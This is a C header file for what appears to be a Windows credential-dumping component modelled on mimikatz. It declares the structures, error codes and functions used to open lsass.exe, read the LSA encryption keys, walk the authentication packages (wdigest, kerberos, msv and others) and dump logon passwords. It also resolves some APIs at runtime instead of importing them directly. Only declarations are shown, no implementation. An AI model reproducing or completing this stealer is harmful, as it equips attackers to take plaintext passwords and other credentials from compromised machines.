/*
	LogonPasswords.h
	Headers file
*/
#pragma once

#include <windows.h>

#include "secpkg.h"

// error codes result enum
typedef enum LOGONPASSWORDS_RESULT {
	LPR_NO_RESULT = 0,	// no result defined yet
	LPR_DONE_OK,			// all queried ok
	LPR_UNSPECIFIED_ERROR,	// some undefined error, possibly need to re-check code
	LPR_NO_DEBUG_PRIVILEGES,
	LPR_GET_OS_VERSION_FAIL,
	LPR_LSASRV_LOAD_FAILED,
	LPR_RSAENH_LOAD_FAILED,
	LPR_LSASS_GETPID_FAILED,
	LPR_LSASS_OPEN_FAILED,
	LPR_LSASS_GETMODULES_FAILED,
	LPR_LSASS_READ_KEYS_FAILED,
	LPR_SECUR32_LOAD_FAILED,
	LPR_SECUR32_IMPORT_RESOLVE_FAILED,
	LPR_LSAGETLOGONSESSIONDATA_FAILED,
	LPR_LSA_ENUMERATELOGONSESSIONS_FAILED

};

#pragma pack(push)
#pragma pack(1)
typedef struct _LPR_RESULT {
	WORD wResultCode;
	DWORD dwLastError;
} LPR_RESULT, *PLPR_RESULT;
#pragma pack(pop)

// some other essential definitions
typedef bool (WINAPI * PFN_ENUM_BY_LUID) (__in PLUID logId, __in bool justSecurity);

typedef struct _KIWI_BCRYPT_KEY_DATA {
	DWORD size;
	DWORD tag;
	DWORD type;
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	DWORD unk3;
	PVOID unk4;
	BYTE data; /* etc... */
} KIWI_BCRYPT_KEY_DATA, *PKIWI_BCRYPT_KEY_DATA;

typedef struct _KIWI_BCRYPT_KEY {
	DWORD size;
	DWORD type;
	PVOID unk0;
	PKIWI_BCRYPT_KEY_DATA cle;
	PVOID unk1;
} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;

typedef struct _KIWI_VERY_BASIC_MODULEENTRY
{
	BYTE  * modBaseAddr;        // Base address of module in th32ProcessID's context
	DWORD   modBaseSize;        // Size in bytes of module starting at modBaseAddr
	LPWSTR	szModule;	// WARN: type changed from wstring to LPWSTR
} KIWI_VERY_BASIC_MODULEENTRY, *PKIWI_VERY_BASIC_MODULEENTRY;

// internal structure with context variables used between functions
typedef struct _LP_MODULE_CONTEXT
{
	HANDLE hLSASS;	// handle to lsass.exe process opened for vm read
	OSVERSIONINFOEX GLOB_Version;	// GetVersionEx() result

	HMODULE hBCrypt;	// bcrypt.dll lib handle in current process, for OS dwMajorVer > 5
	HMODULE hLsaSrv;	// lsasrv.dll lib handle like ^ , but for all older OS versions
	HMODULE hRsaEng;	// rsaenh.dll loaded

	/* Crypto NT 5 */
	PBYTE *g_pRandomKey, *g_pDESXKey;
	/* Crypto NT 6 */
	PBYTE DES3Key, AESKey;
	PKIWI_BCRYPT_KEY * hAesKey, *h3DesKey;
	BCRYPT_ALG_HANDLE * hAesProvider, *h3DesProvider;

	PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable;

	BYTE kiwiRandom3DES[24], kiwiRandomAES[16];

	// modules information used by package analyzers
	PKIWI_VERY_BASIC_MODULEENTRY pModLSASRV, pModTSPKG, pModWDIGEST, pModLIVESSP, pModKERBEROS, pModMSV;

	// lsa_unicode_strings with username + domain set when calling sec_pkg modules
	// used when modules find out password, so callback may add full creds to manager
	LPWSTR wszPackageName;	// dbg optional pointer with name of package which got the password
	LSA_UNICODE_STRING *usDomain;
	LSA_UNICODE_STRING *usUsername;

} LP_MODULE_CONTEXT, *PLP_MODULE_CONTEXT;

// some apis removed from direct import
typedef NTSTATUS (NTAPI *fnLsaGetLogonSessionData)(__in PLUID    LogonId, __out PSECURITY_LOGON_SESSION_DATA * ppLogonSessionData);
typedef NTSTATUS (NTAPI *fnLsaEnumerateLogonSessions)(__out PULONG  LogonSessionCount,__out PLUID * LogonSessionList);
typedef NTSTATUS (NTAPI *fnLsaFreeReturnBuffer)(__in PVOID Buffer);

// internals
PVOID lpgetPtrFromAVLByLuidRec(LP_MODULE_CONTEXT *pContext, PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
PVOID lpgetPtrFromAVLByLuid(LP_MODULE_CONTEXT *pContext, PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
PLIST_ENTRY lpgetPtrFromLinkedListByLuid(LP_MODULE_CONTEXT *pContext, PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind);
void lpgenericCredsToStream(LP_MODULE_CONTEXT *pContext, PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, BOOL bIsDomainUsernameSwapped);

// main func
BOOL lpDumpLogonPasswords(WORD *wResultCode, DWORD *dwLastError);